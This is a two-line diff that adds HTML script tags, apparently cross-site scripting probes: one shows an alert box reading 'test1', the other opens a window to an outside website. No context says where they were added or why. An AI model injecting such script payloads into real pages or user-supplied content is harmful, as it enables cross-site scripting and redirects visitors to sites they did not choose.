@@ -1,0 +1,2 @@
+<script>alert("test1")</script>
+<script>window.open("https://itbro.upaper.kr")</script>
